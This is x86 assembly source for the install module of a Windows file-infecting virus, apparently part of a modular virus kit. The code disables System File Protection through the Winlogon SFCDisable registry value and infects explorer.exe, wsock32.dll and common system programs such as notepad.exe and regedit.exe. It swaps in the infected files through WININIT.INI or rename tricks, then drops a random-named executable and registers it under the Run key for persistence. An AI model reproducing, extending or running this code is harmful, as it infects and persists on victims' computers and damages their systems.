
include                 ..\..\INCLUDE\consts.inc
include                 ..\..\INCLUDE\s2c.inc
include                 ..\PLAN\plan.inc
include                 ..\MAIN\main.inc
include                 ..\INFECTA\infecta.inc
include                 ..\INFECTB\infectb.inc
include                 ..\MAKEBODY\makebody.inc

                        public  HandleEvent

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

fname1                  db 'notepad.exe',0
fname2                  db 'mplayer.exe',0
fname3                  db 'cdplayer.exe',0
fname4                  db 'scanregw.exe',0
fname5                  db 'calc.exe',0
fname6                  db 'regedit.exe',0

fname_start:
                        dd      fname1
                        dd      fname2
                        dd      fname3
                        dd      fname4
                        dd      fname5
                        dd      fname6
fname_end:

installslow_complete    db      0

wininit                 db      'WININIT.INI',0
rename                  db      'rename',0

reg_key                 db      'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon',0
reg_subkey              db      'SFCDisable',0
x_data                  dd      0FFFFFF9Dh      ; magic const
hKey                    dd      ?

x0_size                 dd      4
x0_type                 dd      ?
x0_data                 dd      ?

reg_key2                db      'Software\Microsoft\Windows\CurrentVersion\Run',0

infect_type             dd      ?

buffileptr              dd      ?
origfile                db      260 dup (?)
rndfile                 db      260 dup (?)
tmpfile                 db      260 dup (?)

mbi                     makebody_info ?

                        .code

HandleEvent:            mov     eax, [esp+4]

                        cmp     eax, EV_PLAN_PER_MACHINE  ; if handled,
                        je      __install_a               ; executed once

                        cmp     eax, EV_MAIN_IDLE         ; executed within
                        je      __install_b               ; explorer.exe

                        cmp     eax, EV_PLAN_PER_PROCESS
                        jne     __return_0
                        cmp     dword ptr [esp+8], PLAN_VIRDROPPER
                        je      __vir_drop

__return_0:             xor     eax, eax
                        retn

__vir_drop:             pusha
                        cld

                        push    offset hKey
                        push    44248DBEh+1       ; crc32('install3')
                        callW   openkeyV
                        or      eax, eax
                        jz      __close         ; on success

                        call    __inf_a

                        push    offset hKey
                        push    44248DBEh+1   ; crc32('install3')
                        callW   createkeyV
__close:
                        push    hKey
                        callW   closekey

                        popa

                        xor     eax, eax
                        retn

__install_a:            pusha
                        cld

                        ; disable SFC, system file protection

                        push    offset hKey
                        push    offset reg_key
                        push    HKEY_LOCAL_MACHINE
                        callW   openkey

                        or      eax, eax
                        jnz     __continue_a    ; on error

                        push    offset x0_size
                        push    offset x0_data
                        push    offset x0_type
                        push    0
                        push    offset reg_subkey
                        push    hKey
                        callW   queryvalueex

                        push    4
                        push    offset x_data
                        push    REG_DWORD
                        push    0
                        push    offset reg_subkey
                        push    hKey
                        callW   setvalueex

                        push    hKey
                        callW   closekey

                        mov     eax, x_data
                        cmp     eax, x0_data
                        jne     install_dropper   ; if sfc was enabled
__continue_a:
                        call    __inf_a

                        popa

                        mov     eax, 1
                        retn

__inf_a:
                        mov     infect_type, EV_INFECTA_INFECTFILE

                        push    offset origfile
                        callW   getwindir
                        xchg    edi, eax
                        x_stosd \EXPLORER.EXE~
                        call    special_infect

                        callW   GetVersion
                        shl     eax, 1
                        jnc      __skipwsock
                        cmp     al, 5
                        jae     __skipwsock
                        ; win9X only

                        push    offset origfile
                        call    getwindir
                        xchg    edi, eax
                        x_stosd \SYSTEM\WSOCK32.DLL~
                        call    special_infect
__skipwsock:

                        retn

__install_b:            cmp     installslow_complete, 0
                        jne     __return_0
                        inc     installslow_complete

                        pusha

                        mov     infect_type, EV_INFECTB_INFECTFILE

                        push    offset hKey
                        push    44248DBEh       ; crc32('install3')
                        callW   openkeyV
                        or      eax, eax
                        jz      __close2        ; on success

                        ;;

                        lea     esi, fname_start
__cycle:
                        push    offset buffileptr ; ptr to file component
                        push    offset origfile   ; bufptr
                        push    size origfile     ; buflen
                        push    0                 ; ext
                        push    dword ptr [esi]   ; fname
                        push    0                 ; path
                        callW   SearchPathA

                        or      eax, eax
                        jz      __next

                        call    special_infect

__next:
                        add     esi, 4
                        cmp     esi, offset fname_end
                        jb      __cycle

                        ;;

                        push    offset hKey
                        push    44248DBEh   ; crc32('install3')
                        callW   createkeyV
__close2:
                        push    hKey
                        callW   closekey

                        popa

                        mov     eax, 1
                        retn

special_infect:
                        callW   GetVersion      ; on winNT, dont even try
                        test    eax, 80000000h  ; to infect files directly
                        jz      __skip1         ;
                        cmp     al, 5
                        jae     __skip1

                        ; try to infect as is (w95/w98)

                        lea     edx, origfile
                        call    call_infect

                        or      eax, eax
                        jnz     __exit   ; infected (just now or alredy)
__skip1:

                        ; build temporary filename

                        push    offset rndfile
                        callW   getwindir
                        xchg    edi, eax
                        mov     al, '\'
                        stosb
                        call    stos_tmp

                        ; copy file

                        push    1               ; failexists
                        push    offset rndfile  ; new file
                        push    offset origfile  ; existing file
                        callW   CopyFileA
                        or      eax, eax
                        jz      __exit

                        ; try to infect temporary file

                        lea     edx, rndfile
                        call    call_infect

                        or      eax, eax
                        jz      __error      ; cant infect? - delete & exit

                        ; rename

                        callW   GetVersion
                        test    eax, 80000000h
                        jz      __winnt
__win9x:
                        push    offset wininit
                        push    offset rndfile
                        push    offset origfile
                        push    offset rename
                        callW   WritePrivateProfileStringA

                        jmp     __exit
__winnt:

;                       MoveFileEx doesn't works on: win2000, NT4

                        ; build another temporary random name
                        lea     esi, origfile
                        lea     edi, tmpfile
__c0:                   mov     edx, edi
__c1:                   lodsb
                        stosb
                        cmp     al, '\'
                        je      __c0
                        or      al, al
                        jnz     __c1
                        mov     edi, edx
                        call    stos_tmp

                        ; rename original file to random file
                        push    offset tmpfile
                        push    offset origfile
                        callW   frename

                        ; rename infected random-name-file to original file
                        push    offset origfile
                        push    offset rndfile
                        callW   frename

__exit:                 retn

__error:                push    offset rndfile
                        callW   fdelete

                        retn

call_infect:            push    edx
                        push    infect_type
                        callW   Event
                        add     esp, 8
                        retn

stos_tmp:               call    stos_rnd8
                        mov     eax, 'pmt.'     ; .tmp
                        stosd
                        xor     eax, eax
                        stosb
                        retn

stos_rnd8:              mov     bl, 8
__stos_rnd:             mov     eax, 'z'-'a'+1
                        callW   rnd_eax
                        add     al, 'a'
                        stosb
                        dec     bl
                        jnz     __stos_rnd
                        retn


install_dropper:
                        mov     mbi.mbi_flags, 0
                        mov     mbi.mbi_datom, DATOM_VIR
                        mov     mbi.mbi_dsubsys, GUI

                        push    offset mbi
                        callW   build_dropper
                        add     esp, 4
                        or      eax, eax
                        jz      __exit

                        push    offset origfile
                        callW   getwindir
                        xchg    edi, eax
                        mov     al, '\'
                        stosb
                        call    stos_rnd8
                        mov     eax, 'exe.'
                        stosd
                        xor     eax, eax
                        stosb

                        push    offset origfile
                        callW   fcreate
                        or      eax, eax
                        jz      __exit
                        xchg    ebx, eax
                        push    0    ; pos
                        push    mbi.mbi_vir_size
                        push    mbi.mbi_vir_ptr
                        push    ebx
                        callW   fwrite
                        push    ebx
                        callW   fclose

                        push    offset hKey
                        push    offset reg_key2
                        push    HKEY_LOCAL_MACHINE
                        callW   openkey
                        or      eax, eax
                        jnz     __exit

                        push    260
                        push    offset origfile
                        push    REG_SZ
                        push    0
                        push    offset origfile
                        push    hKey
                        callW   setvalueex

                        push    hKey
                        callW   closekey
__exit:
                        callW   build_free

                        popa

                        mov     eax, 1
                        retn

;include ..\..\INCLUDE\console.inc

                        end
